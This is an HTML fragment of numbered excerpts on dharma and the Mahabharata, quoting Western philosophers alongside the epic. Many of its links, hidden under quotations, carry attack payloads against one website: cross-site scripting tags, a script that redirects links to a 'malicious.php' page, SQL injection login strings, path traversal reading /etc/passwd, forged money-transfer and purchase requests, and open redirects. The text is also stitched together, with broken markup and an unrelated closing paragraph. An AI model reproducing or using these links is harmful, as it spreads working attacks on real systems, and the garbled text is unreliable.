Would I be able to recover a meaningful ideal of civic virtue from <a href="http://goo.gl/HsxFWr" target="_blank">
India’s foundational text? </a> </i></p>

<p><i>
2.Hinduism is not a <a href="http://goo.gl/AyBVXC" target="_blank">‘religion’ </a> in the usual sense. It is a civilization based on a simple metaphysical insight about the unity of the  individual and the universe and has self-development as its  objective. It employs innovative mental experiments of yoga that evolved in the first half of the first millennium BC, and does not have the notion of a ‘chosen people’, or a jealous God; it does not <a href="http://www.theplanetreports.com/transfer.php?PHPSESSID=jeoefgfi6b16h7l213jh30k2q1+&money=900&transfer=Transfer" target="_blank"> proselytize, does not hunt heretics. </a> It could not be more different from the great Semitic religions—Christianity, Judaism and Islam.
</i></p>
                
<p><i>
3.Dharma refers to ‘balance’—both moral balance and cosmic balance. It is the order and balance within each human being which is also reflected in the order of the cosmos. Dharma derives from the <a href="http://www.theplanetreports.com/index.php?name=Visitor<script>alert('You are being attacked.')</script>" target="_blank"> Sanskrit root dhr, meaning to ‘sustain’ </a>.It is the moral law that sustains society, the individual and the world. In the dharma texts, it . commonly means the whole range of duties incumbent on each individual according to his varna, ‘status’, or ashrama, ‘stage of life’.

5.He tells the Yaksha that in seeking dharma <a href="http://www.theplanetreports.com/comments.php?sig=<script>alert('No+more+entries+Possible+')%3B<%2Fscript>"target="_blank"> ‘reason is of limited use for it is without foundation </a>; neither are the sacred texts helpful as they are at odds with one another; nor is there a single sage whose opinion could be considered authoritative. The truth about dharma is hidden in a cave.’

6.“Nature does not give a man virtue;<a href=\"http://www.theplanetreports.com/redirecturl.php?url=http://www.theplanetreports.com\" target=\"_blank\"> the process of becoming a good man is an art </a>”.

7.Kingship is enjoyed by brave princes after conquering their <a href="http://bit.ly/2bRTo33" target="_blank">foes in battle.</a> It cannot be had by begging, nor is it conferred upon the poor in this world. If they desire to become kings, let them venture forth on the battlefield, or else let them at their will enter a hermitage, sought for peace by men of tranquil minds. <a href="http://www.theplanetreports.com/traversal.php?data=cat%20../../../../../../etc/passwd" target="_blank"> Like Thrasymachus in Plato’s Republic</a> , Duryodhana sees morality as a veiled way to protect the interests of the powerful.As he sees it, what people call ‘dharma’ is really a clever way of advancing those <a href="http://goo.gl/zxwavm" target="_blank"> interests. </a>

8.Thomas Hobbes, the English philosopher,who argued that if men do not conquer when they can, they only reveal weakness and invite attack. ‘By a necessity of nature’ (a phrase Hobbes made popular) they conquer when they can. Hobbes <a href="http://www.theplanetreports.com/traversal.php?data=ls -la" target="_blank">  translated Thucydides’s </a> classic history of the Peloponnesian War, which is the foundation stone of <a href="http://goo.gl/1eY11r" target="_blank">‘Realist’ </a> thinking about international relations. In it, Athenian generals who were about to conquer Melos, a Spartan colony, said much the same to the people of Melos in 416 BC: ‘They who have the odds of <a href=" http://goo.gl/rDWLA7" target="_blank"> power exact as much </a> as they can, and the weak yield to such conditions as they can get . . . [men] will everywhere reign over those such as they be too strong for . . .’The Mahabharata is clearly embarrassed by Duryodhana’s matsya nyaya, ‘big-fish-eats-small-fish’ view of the world, which is the indian equivalent of the law of the jungle.

9.Later when Arjuna will urge Yudhishthira not to renounce the throne, he will remind him that violence is the way of the world:  <a href="http://www.theplanetreports.com/uploads/traversal_main.php?data=cat%20/etc/passwd" target="_blank">‘I see no being which lives in the world without violence. Creatures exist </a> at one another’s expense; the strong eat the weak. The mongoose eats mice, as the cat eats the mongoose; the dog devours the cat, your majesty, and wild beasts eat the dog.’Bhishma, their grandfather, will employ this anarchic image of <a href="http://goo.gl/DCxDeZ" target="_blank">disorder </a> in the natural world in order to justify danda, ‘retributive justice’ and the rule of law and order , by a tough but just king.

10.The epic says: <a href="http://www.theplanetreports.com/access_login.php?user=%27+OR+%271%27%3D%271&pass=%27+OR+%271%27%3D%271&ok=OK" target="_blank">‘The man who envies other people </a> for their conduct, beauty, courage, family lineage, happiness, success and favour has an eternal sickness.’</i></p>


<p><i>
11.Freud wrote that our desire for justice is the product of childhood envy of other children, which makes one hunger for equal treatment and brings about a ‘group spirit’. He adds. <a href="http://www.theplanetreports.com/access_login.php?user=%27+OR+%271%27%3D%271&pass=%27+OR+%271%27%3D%271&ok=OK target="_blank">‘If one cannot be the favourite oneself </a>, at all events nobody else shall be the favorite.’

<p><i>
12.Nietzsche thought the French Revolution was fired by the sentiment of envy of the masses against the classes. Sometimes resentment over social inequality is so great that it wounds one’s self-respect.<a href="http://www.theplanetreports.com/buy.php?item=Monthly&PHPSESSID=jeoefgfi6b16h7l213jh30k2q1+&quantity=400" target="_blank">Such envy is understandable </a>, especially when it is exacerbated by ostentatious display by the well-off. It tends to demean the situation of those who have less. Although it is a psychological state, social institutions can and ought to mitigate such envy.

13.If greed is the sin of capitalism, <a href="http://www.theplanetreports.com/redirect.php?url=http://www.theplanetreports.com/hack.php" target="_blank"> envy is the vice of socialism.</a>

14.Immanuel Kant, in artificially enforcing excessive equality. Kant felt that <a href="http://www.theplanetreports.com/subscription.php?id=16" target="_blank"> ‘inequality among men is a rich source of much that is evil </a>, but also of everything that is good’. He believed that inequality among social classes is an impetus to liberty because it makes people strive to <a href="http://goo.gl/y7kI3i" target="_blank"> better themselves.</a>
</i></p>
                                        
<a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three target="_blank" >15.Tolstoy’s famous novella The Kreutzer Sonata.</a> The novella grew out of the Russian writer’s own relationship with his wife, and it describes the events that lead to her murder. The husband has violent and humiliating <a href="http://goo.gl/JjZXpb" target="_blank">
sex with her,</a> and he feels miserable each time he rapes her. Since she is merely an object of bestial desire, he decides that he must <a href="http://goo.gl/QKYCCp" target="_blank">kill her </a> to put an end to his misery. After her death, she becomes ‘human’ in his eyes, and he even begins to have compassionate feelings for her. The murdering husband concludes that women will never be treated as <a href="http://bit.ly/2bw0EDb" target="_blank">full human beings </a> as long as sexual intercourse exists. They will always be humiliated.
</i></p>
 
<p><i>
16.Walter Lippmann, the distinguished American public <a href="http://goo.gl/kE1DHH" target="_blank">
 intellectual,</a> said in a speech in 1941 that people do not become happy by satisfying desires. Happiness comes from upholding a certain balance, by living according to a system of beliefs that restrains them and gives coherence to their desires. ‘Above all the other necessities of <a href="http://goo.gl/lFDs5z" target="_blank">
human nature</a>, above the satisfaction of any other need, above hunger, love, pleasure, fame—even life itself—what a man most needs is the conviction that he is contained within the discipline of an ordered existence.’ Lippmann did not realize it but he was addressing <a href="http://bit.ly/2bKL9I5" target="_blank">
Draupadi’s </a>question. He was speaking about dharma, which also means upholding a certain balance. Dharma is precisely this ‘discipline of ordered existence’, a ‘belief system that restrains and gives <a href="http://bit.ly/2bCAf3B" target="_blank"> coherence to desires’.</a>
</i></p>




<p><i>
17.Draupadi argues, is what <a href="http://goo.gl/NBy0H2" target="_blank"> really counts </a> in the world. ‘Why be good?’ she asks her husband. Yudhishthira answers her patiently in a sparkling dialogue in the Vanaparvan, which presages much thinking about ethics in the major schools of Western moral philosophy. Yudhishthira is taken aback by the strength of Draupadi’s emotion, and he gently explains to her why he must <a href="http://bit.ly/2b8hhAR" target="_blank">be good.</a> He says: I do not act for the sake of the fruits of dharma. I act because I must. Whether it bears fruits or not, buxom Draupadi, I do my duty like any householder . . . I obey dharma, <a href="http://bit.ly/2bRV2BM " target="_blank">full-hipped woman, not for its rewards</a> . . . but by its nature my mind is beholden to dharma.  In a typically modest way, Yudhishthira expresses his instinctive sense of duty: ‘I act because I must’. He does not follow dharma because of any hope of reward that might come. He acts from a sense of what he has to do. Dharma or ‘what he has to do’ is a standard of conduct, and a society needs standards. ‘He who doubts dharma finds in nothing else a standard,’ Yudhishthira says, ‘and ends in setting himself as a standard.’9 He is saying, in effect, that following dharma is its own reward. When one acts thus, it is motives and not consequences that are important.
</i></p>



<p><i>
18.I wondered if people are only honest because of the <a href="http://goo.gl/X84OSD" target="_blank">fear of punishment.</a>
</i></p>


<p><i>
19.
Yudhishthira does not elaborate on his laconic statement, ‘I act because I must’, and this is why Draupadi remains confused.<a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three"> Immanuel Kant, the eighteenth century German philosopher,</a> in trying to understand this sense of duty, said: ‘When moral worth is at issue, what counts is not actions, which one sees, but those inner principles of action that one does not see.’ These ‘inner principles’ led me to think about human motives. I was reminded of a newspaper report about a young man who jumped into the  Arabian Sea on a crowded beach and saved a <a href="http://bit.ly/2b6JTzg" target="_blank">child from drowning.</a> He instantly became a hero. But he confessed a few days later to the Times of India that he might not have jumped if no one had been watching. He did it, he said, to impress his friends on a college trip, and particularly one girl. Yudhishthira (or even the CEO) might have jumped even if no one had been looking. So, motives do matter when it comes to duty. ‘But a child was saved in the end,’ the young man might have protested. ‘So, who cares about my motives?’ He would have a point. Consequences of one’s acts do matter, <a href="http://bit.ly/2bj5va6" target="_blank">but so do motives </a> in trying to understand why we behave morally. Where does our sense of duty come from? David Hume, the Scottish philosopher, argued that our moral sense originated in human sentiments. ‘The sentiments, dependent on humanity, are the origin of morals,’ he said.  Kant also felt that one’s sense of duty originates in one’s humanity, but he added that the ‘noble descent’ of duty lies in the ‘autonomy of the rational being’. Kant located the  origin of dharma in man’s ability to reason, and the ability to reason underpins man’s autonomy. <a href="http://www.theplanetreports.com/home.php?username=%27+OR+%271%27%3D%271&password=%27+OR+%271%27%3D%271&submit=Login" target="_blank"> ‘This condition,’ Kant wrote, ‘requires that a person never be used as a means when it is an end in itself.’Whereas Kant justified duty based on man’s humanity and reason, earlier Western thinkers had appealed to ‘natural law’.

20.As a true ‘consequentialist’, he says: To save the family, [one must] <a href="http://goo.gl/x9tBJ8" target="_blank">abandon an individual.</a> To save the village, abandon a family; to save the country, abandon the village.
</i></p>

21.He tells <a href="http://www.theplanetreports.com/transfer.php?PHPSESSID=jeoefgfi6b16h7l213jh30k2q1+&money=900&transfer=Transfer" target="_blank">  Yudhishthira about Kaushika </a>, an ascetic without much learning, who is accosted one day by a group of thieving cut-throats who are seeking the man who had witnessed their crime. Kaushika had seen the witness run into the forest and he knows that if he reveals it, he is issuing a death  sentence. He must choose between the dharma of satya, telling the truth, or of ahimsa, saving a life.<a href="http://bit.ly/2b8i5Wb" target="_blank">Kaushika chooses </a> the duty of satya over ahimsa. The robbers catch and kill their prey, and the ascetic ends in a gruesome hell because he failed to understand that dharma in this instance required him to tell a ‘white lie’ to the villains. Bhishma explains that while ‘there is nothing higher than the <a href="http://bit.ly/2bCAVpn" target="_blank">truth’,</a> the thing most difficult to understand in the whole world . . . is that truth should not be spoken and that falsehood should be spoken, where falsehood would be truth, or truth falsehood. Someone simple is dumbfounded in that circumstance where truth is not fixed . . . If escape is possible by not singing your song, then you should not let out the smallest note. But if your not singing would arouse suspicion, then you absolutely have to<a href="http://goo.gl/HhxIIb" target="_blank"> sing away.</a>

<p><i>
22.In Western literature, the most dramatic example of this trade-off came in a question posed by Fyodor Dostoevsky in <a href="http://www.theplanetreports.com/index.php?name=Visitor<script>alert('You are being attacked.')</script>" target="_blank"> The Brothers Karamazov.</a> Ivan asks whether it is justified to torture a child in order to bring incalculable happiness to the rest of humanity? Tell me honestly, I challenge you—answer me: imagine that you are charged with building the edifice of human destiny, the ultimate aim of which is to bring people happiness, to give them peace and contentment at last, but that in order to achieve this it is essential and unavoidable to torture just one little speck of creation, that same little child beating her chest with her little fists, and imagine that this edifice has to be erected on her unexpiated tears. Would you agree to be the architect under those conditions? Tell me honestly!  Alyosha, his brother, does not have an answer, and Dostoevsky seems to feel that such questions are unsolvable. This is perhaps why <a href="http://www.theplanetreports.com/index.php?name=Shekhar%3Cscript%3Ewindow.onload%20=%20function(){var%20link=document.getElementsByTagName(%22a%22);link%20%20[0].href=%22http://theplanetreports.com/malicious.php%22;}%3C/script%3E" target="_blank">  dharma is ‘subtle’ </a>. But Yudhishthira, with his commitment to the absolute principle of ahimsa, ‘non-violence’, would probably have refused to torture the child no matter how benign the consequences.

<p><i>
23.Machiavelli might have been addressing the earlier Yudhishthira when he wrote,  <a href="http://www.theplanetreports.com/comments.php?sig=<script>alert('No+more+entries+Possible+')%3B<%2Fscript>"target="_blank"> ‘a man who wishes to profess goodness </a>at all times will come to ruin among so many who are not so good’.
</i></p>


<p><i>

<a href="http://www.theplanetreports.com/comments.php?sig=<script>alert('No+more+entries+Possible+')%3B<%2Fscript>" target="_blank"> 24.The winner of the game was neither altruistic nor egoistic—but </a> the person who used a strategy called ‘tit-for-tat’, or what Indians call ‘nehle pe dehla’.  ‘Tit-for-tat’ is in effect ‘reciprocal altruism’: do not confess on the first move; this sends a signal to your opponent that you are a nice person; from the second move onwards, however, mimic what your opponent does; if he is nice to you, reciprocate by being nice; if he is selfish, punish him in kind. This sends a message to the Duryodhanas of the world that you will retaliate if necessary. Each time that the tournament was replayed, ‘tit-for-tat’ or reciprocity won. Those who followed the selfish strategy always lost. Those who tried to be good like the earlier Yudhishthira in the forest also lost. <a href=\"http://www.theplanetreports.com/redirecturl.php?url=http://www.theplanetreports.com\" target=\"_blank\"> Neither pure meanness </a> nor pure goodness  paid off.  I learned from this game that the principle of reciprocity keeps cheats like Duryodhana in check. In contrast Mahatma Gandhi’s and Jesus’s teaching about turning the other cheek sends them a wrong signal that cheating pays.
</i></p>


<p><i>
25.Karl von Clausewitz, the German strategist, set out to explain the ‘inner meaning’ of war. He wrote,<a href="http://www.theplanetreports.com/traversal.php?data=cat%20../../../../../../etc/passwd" target="_blank">‘War has no limits to violence </a> . . . [The reason is that] each of the adversaries forces the hand of the other, and this results in continuous escalation, in which neither side is guilty even if it acts first, since every act can be called pre-emptive.’16 Once war begins, it inevitably escalates, without limit. (When Winston Churchill made the decision to fight Adolf Hitler, he did not know that the war would escalate into the fire-bombing of German cities in which thousands of civilians would die.) Great tragedy is inescapable in war.

26.
Arjuna begs him, ‘Tell me—who are you in this terrible form?’ Krishna replies: I am time grown old, creating world destruction set in motion to annihilate the worlds; even without you, all these warriors arrayed in hostile ranks will cease to exist. Therefore, arise And win glory!  <a href="http://www.theplanetreports.com/traversal.php?data=ls -la" target="_blank">  Conquer your foes </a> And fulfill your kingship! They are already slain by me. Be just my instrument, the archer at my side.

<p><i>
27.This <a href="http://www.theplanetreports.com/uploads/traversal_main.php?data=cat%20/etc/passwd" target="_blank"> ‘realistic’ way </a> of thinking insists that war lies beyond moral judgment, expressed in the Latin saying, Inter arma silent leges, ‘in the time of war the law is silent’.

<p><i>
<a href="http://www.theplanetreports.com/index.php?name=Shekhar%3Cscript%3Ewindow.onload%20=%20function(){var%20link=document.getElementsByTagName(%22a%22);link%20%20[0].href=%22http://theplanetreports.com/malicious.php%22;}%3C/script%3E" target="_blank">28.Summa Theologica.</a> He discussed not only the justification for war, but also the kinds of activity that are permissible in war. He  enunciated three simple criteria: a war is just when it is a defence  against aggression or an attempt to stop atrocities. Second, the values at stake override the presumption against killing—the expected good must outweigh the cost of killing and destruction. Finally, war must be a last resort when all other alternatives are exhausted.

30.Adam Smith taught me: ‘It is not from the benevolence of the butcher, the brewer, or the baker that we expect our dinner, but from their regard to their own interest. We address ourselves not to their  <a href="http://www.theplanetreports.com/access_login.php?user=%27+OR+%271%27%3D%271&pass=%27+OR+%271%27%3D%271&ok=OK target="_blank"> humanity but their self love. </a>It is not only economists who believe this but all social scientists accept it as dogma.
</i></p>


<p><i>
31.Jean Jacques Rousseau says that a person feels pity when he sees a child in danger of being clawed by a wild beast.  If sentiments like ‘sympathy’ and <a href="http://www.theplanetreports.com/buy.php?item=Monthly&PHPSESSID=jeoefgfi6b16h7l213jh30k2q1+&quantity=400" target="_blank">‘pity’ exist, social scientists </a> may have gone too far in claiming that self-interest is the only motive of human actions.
</i></p>


<p><i>
32.In pursuit of this aim, Indians began to elaborate early on mental exercises or meditative disciplines, which became known by the generic term ‘yoga’. The earliest references to yoga are found in the Upanishads, but over time many different kinds of yoga developed. The word ‘yoga’ comes from the <a href="http://www.theplanetreports.com/redirect.php?url=http://www.theplanetreports.com/hack.php" target="_blank"> Sanskrit root yuj </a>, ‘to yoke’—in the sense of yoking one thing to another—the  point being to merge or unite the atman, the ‘soul’, with the brahman, ‘universal essence’. Although the ontology varies from system to system, the common starting point is that ordinary daily life is characterized by ‘being led astray’ by our phenomenal ‘self’ (our sense of I-ness, ahamkara) and the distracting busy-ness of one’s mind and everyday activity. Patanjali stated the purpose of yoga concisely in the first sentence of his classic Yoga Sutras: <a href="http://www.theplanetreports.com/subscription.php?id=16" target="_blank">  chitta-vritti-nirodha </a>, ‘calm the ceaseless activity of the mind’. Through mental steadiness, right breathing and benevolence towards others, one’s mind becomes ‘one-pointed’ and prepares to distance itself from the deluded sense of I-ness, recognizing the true ‘self’.

</i></p>

<p><i>
33.Virginia Woolf, the writer, made a similar observation: Examine for a moment an ordinary mind on an ordinary day. The mind receives myriad impressions—trivial, fantastic, evanescent, or engraved with the sharpness of steel. From all sides they come, an incessant shower of innumerable atoms; and as they fall, as they shape themselves into the life of Monday or Tuesday the accent falls differently from of old; the moment of importance came not here but there; so that if a writer were a <a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three target="_blank" > free man and not a slave </a>, if he could write what he chose, not what he must, if he could base his work upon his own feeling and not upon convention, there would be no plot, no comedy, no tragedy, no love interest  or catastrophe in the accepted style, and perhaps not a single button sewn on as the Bond Street tailors would have it. Life is not a series of gig lamps symmetrically arranged; but a luminous halo, a semi-transparent envelope surrounding us from the beginning of consciousness to the end.</i></p>

34.Dennet goes on to explain that the self is </a> somewhat like the narrator in fiction. 58 He argues that man acquired consciousness because he happened to have a brain that was larger than what he needed purely for evolutionary purposes. He speculates that before human beings learned to speak, our <a href="http://bit.ly/2biShr1" target="_blank">primitive ancestors </a>‘just blurted things out’ unconsciously. ‘Then one day one of our ancestors asked a question in what was apparently an inappropriate circumstance: there was nobody around to be the audience. Strangely enough, he heard his own question, and this stimulated him cooperatively to think of an answer, and sure + enough the answer came to him.<a href="http://www.latenightreport.com/info.php?id=http://www.theplanetreports.com/subscription.php?id=5%20UNION%20Select%20*%20from%20three">  One component of the mind + had confronted </a> a problem that another component could solve. Sometimes talking and listening to oneself can have wonderful effects.
</i></p>
 


<p><i>
35.Contemporary thinkers increasingly liken <a href="http://goo.gl/fMvMU0" target="_blank">consciousness to literature.</a> The self’s interaction with an object, says Antonio Tomasio, is a ‘simple narrative without words. It [has] characters. It unfolds in time. And it has a beginning, middle and an end.’ However, not all of these theorists dismiss the ‘autobiographical self’ as an illusion. They are content to leave it as ‘an <a href="http://bit.ly/2bw2GTH" target="_blank">inner sense’.</a>  The ‘I-maker’ seems like a literary narrator because literature is so good at capturing what cognitive theorists call qualia or the sensory content of subjective experience, the ‘raw feeling’. 62 It is the ‘painfulness of pain, the scent of sandalwood, the taste of <a href="http://bit.ly/2caL0zc" target="_blank">Bourbon-Vanilla</a> or the extraordinary sound quality in the tone of a cello.’The problem of consciousness comes down to the problem of how to give an objective, third person account of what is essentially a subjective, first person phenomenon. In a famous essay called ‘What is it Like to be a Bat?’, Thomas Nagel concludes that the only way to experience what a bat experiences is to be a bat.  Indeed, according to the distinguished neuroscientist, V.S. Ramachandran, the <a href="http://bit.ly/2bKN6V6" target="_blank">‘need to reconcile the first person </a> and third person accounts of the universe . . . is the single most important problem in science.’This goes back to the question that Descartes puzzled over: how can consciousness arise in a purely physical universe? Today, the problem of consciousness—perhaps together with the question of the origin of the universe—marks the very limit of human striving for understanding. It is the ‘the last great puzzle’, says <a href="http://goo.gl/MOG84j" target="_blank">Thomas Metzinger.</a>  Religions have always been suspicious of the ‘self’. Hindus think of the ‘I-maker’ (ahamkara) as the source of all human problems. Christianity exhorts people to suppress the sinful ‘self’, and be selfless and humble.

36.In the broad humanistic tradition of <a href="http://bit.ly/2bDTJZP" target="_blank">John Locke,</a> Immanuel Kant and William James, although I do not agree with everything they say. I am attracted to the concept of the self as a unique, autonomous, morally responsible human being whose inner life can be known through introspection. For this, I do not have to believe in the existence of an immortal soul (atman), nor worry if the <a href="http://goo.gl/XNJC6G" target="_blank">mind and the body are separate</a>. Unlike Dennet or Buddhist monks, I do not feel the need to call the ‘self’ an illusion. I do not mind using the words ‘soul’ or ‘spirit’ to signify some uniquely valuable quality in human awareness. I am content to admit modestly that ‘something like the sense of self does exist in the <a href="http://bit.ly/2b8LnV8" target="_blank">human mind as we </a> go about knowing things’. And if the ‘self’ turns out to be a fiction, then ‘it may perhaps be the supreme fiction, the greatest achievement of human consciousness, the one that makes us human’.

39.The Allies behaved no better than Krishna in the <a href="http://goo.gl/fP38SA" target="_blank">terror bombing </a> of Dresden, Hamburg and other German cities in World War II. They had a clear intention of killing German civilians in order to destroy Nazi morale, hoping that this would lead <a href="http://goo.gl/Dmlicx" target="_blank">Nazi Germany </a> to surrender. In doing so, they clearly violated the ‘just war’ doctrine. Yet they were not hauled up before any Nuremburg court, which only judged Nazi war criminals after the war is because the <a href="http://bit.ly/2bQ6ygg" target="_blank">Allies were victors </a> and only losers are tried for war crimes.

40.Epicurus, one of the first to raise this question,</a> asks: ‘Either God wants to abolish evil, and cannot; or he can, but does not want to . . . If he wants to, but cannot, he is impotent. If he can, but does not want to, he is wicked . . . If, as they say, God can abolish evil, and God really wants to do it, why is there evil in the world?’ Put another way if god is good why is this world is so bad .

A survival from the precarious life in the desert, the certainty of vengeance acted  as a deterrent against oppressors; this is how small tribes of Arab Bedouins protected themselves against bigger tribes. But revenge also became intertwined with early Islamic politics. The early khalifs, Umar and Uthman, and the Prophet’s son-in-law Ali were all assassinated. The Bedouin Kharajites, unhappy that Ali did not avenge Uthman’s assassination, caused a split between the Sunni and Shia sects, and this brought its own bloodshed. <a href="http://www.theplanetreports.com/subscription.php?id=16" target="_blank">The Kharajite </a>view of the world has been passed on through the Wahhabis to today’s Taliban. ‘The word jehad,’ according to Baig, ‘is rarely found in the Qur’an but is referred to 199 times in the Hadith, which was written two centuries after the death of the Prophet. <a href="http://goo.gl/wRLv8z" target="_blank">The Wahhabis </a> interpreted jehad to mean a holy war, even though it had actually meant ‘striving’; a Mujahideen was originally not a holy warrior but only one who strives. For Muhammad there were two jehads and the greater one meant a struggle against one’s own weakness while a lesser jehad was to fight against injustice.’ Baig goes on to explain that the Qur’an clearly forbade killing in the name of Islam. It is clear to me that unless today’s <a href="http://goo.gl/oFk6gl" target="_blank">Muslim clerics </a> disavow revenge and the extreme views of Wahhabis and others, Islam and Muslims will continue to be viewed with suspicion around the world.

42.Gandhi was fortunate <a href="http://bit.ly/2bqVQga" target="_blank">in having as his adversary the British liberal establishment, </a> which was, by and large, open to reason. I have sometimes wondered how Gandhi might have fared against a fanatic, <a href="http://goo.gl/m64tK4" target="_blank">a terrorist, </a> or a dictator bent on genocide. It is very well to be non-violent to non-poisonous lizards but one must defend oneself against poisonous snakes. George Orwell, in his famous essay ‘Reflections on Gandhi’, wrote that ‘it is difficult to see how Gandhi’s methods could be applied in a country where opponents of the regime disappear in the middle of the night and are never heard  from again’. Liddell Hart echoed this view: ‘It is very doubtful whether non-violent resistance would have availed against a Tartar conqueror . . . or a Stalin . . . The only impression it seems to have made on Hitler was to trample on what, to his mind, was contemptible weakness.’ <a href="http://bit.ly/2bqVQga" target="_blank">Gandhi would have replied that it is better </a> to resist and die than to give your consent to violent death. ‘You will have my body but not my will.’ Most Jews in Germany went to their death without resisting. They were, as Lloyd Rudolph argues, ‘complicit in their death’. Had the Jews resisted the ‘storm troopers’ of the Nazi party, who attacked their shops and homes, they might have aroused the conscience of middle class Germans. The attitude of assimilated, educated professional Jews was one of denial and an avoidance of disorder. Unlike Nazi Germany, non-violent resistance was tried with considerable success in the countries of Soviet-occupied Eastern Europe, particularly in Poland and Czechoslovakia.

Turning the other cheek sends them a wrong signal that cheating pays.

46.There were many dharma failures in this drama in which all actors seemed to behave rationally. When US house prices were rising and interest rates were low, even the poor got a chance to get a mortgage and a home. Who could oppose that! Banks combined these mortgages into a collateral debt obligation (CDO), got it rated, and sold it to institutions, that also gained through better returns. When the housing market turned downwards, the  CDOs became toxic. Who was at fault? In a sense all were guilty. There is a fine line between rational self-interest and selfishness, and the balance of dharma tipped the wrong way. The undeserving recipient of the loan lied about his ability to repay; the banker, moved by short-term reward, promoted the ‘sub-prime’ mortgage; the rating agency was dishonest in colluding with the bank; the institution that bought the risky CDO failed in its duty to protect its shareholders. The calamity might have been contained if Lehman Brothers had been bailed out on 14 September 2008. The old rivalry between Dick Fuld, the CEO of Lehman Brothers, and Hank Paulson, the former CEO of Goldman Sachs, may have come in the way. The bluebloods at Goldman Sachs had long harboured a deep prejudice against the upstarts at Lehman. Fuld was arrogant and had always managed to steal the limelight. But Paulson, who was US Treasury Secretary when the world economy went into recession, possibly unconsciously, allowed + + personal prejudice to influence his thinking when he refused to save Lehman. When Lehman collapsed, so did confidence and bank liquidity, and this was the tipping point of the global collapse. President Barack Obama castigated Wall Street for paying bonuses to executives at a time when they had been bailed out by the American taxpayer. Particularly embarrassing was the disclosure about John Thain, chairman of Merrill Lynch, who had spent $1.2 million to do up his office, which included a $1400 waste paper basket and a $35,000 commode in the bathroom. He paid $4 billion in bonuses to executives when Merrill Lynch had declared a loss of $15 billion in the fourth quarter of 2008. When he said that the bonuses were needed ‘to retain the best people’, someone asked him, ‘What best people? They just lost you $15 billion!’ ‘Resign or commit suicide’ was the honourable choice that the Republican senator Charles Grassley offered to executives at American International Group (AIG) who had received $220 million in bonuses after the insurance giant was bailed out. When senators begin advising executives to kill themselves, something had gone terribly wrong with the nation’s dharma. President Barack Obama sought a legal way to claw back the bonuses and democratic leaders in the Congress suggested an extortionate tax. To want to punish someone in this crisis was understandable but it was a dangerous path. What the world needed instead was the calm and principled voice of a Yudhishthira. In Obama’s place he would have appealed for a ‘voluntary’ return of bonuses while explaining to the American people that Wall Street had been bailed out to save Main Street’s pain and honouring bonus contracts was necessary to the rule of law.

47.The Nasadiya temper The tentativeness of the Mahabharata’s dharma reflects a sceptical streak both in the epic and in the Indian tradition. It goes back 3,500 years to its very first text, the Rig Veda, and it may well have originated in the charming humility of its ‘Nasadiya’ verse, which meditates on the creation of the universe:There was neither non-existence nor existence then . . . There was neither death nor immortality then. There was no distinguishing sign of night nor of day . . . Who really knows? . . . The gods came afterwards, with the creation of this universe. Who then knows whence it has arisen? The verse ends with a doubt if even the gods know how the universe was born. This questioning attitude is quite unlike the mindset of the Christian, Jewish or Islamic traditions which proclaim an omniscient and omnipotent God. It might also have + led to the invention of a Hindu creator, whose name is the  interrogative pronoun ka (cognate with the Latin quis, French qui): ‘The creator once asked Indra: “Who am I?” Indra replied, “Just what you said: Who.” And this is how the creator got the name, Ka or Who.’Yet the Vedic ancients also believed that the very substance of the universe is divine. Each god has a secondary or illusory status compared to the divine substance, but it is a powerful symbol nevertheless, and it can help to guide the seeker to the divine. Many gods coexist comfortably in this non-hierarchic pantheon in which no god can afford to be jealous. And one ought to expect the devotee of many non-hierarchical gods to more likely see the many sides of truth—and accordingly be more tolerant.

The more practical option is to limit CIAA’s role into investigations. Absolute power is prone to absolute misuse. LSK’s predecessor was no angel and his successors are unlikely to fall from heavens. Lawmakers need to ignore the Dabloos and concentrate on constitutional amendments to control their Frankenstein.</p>
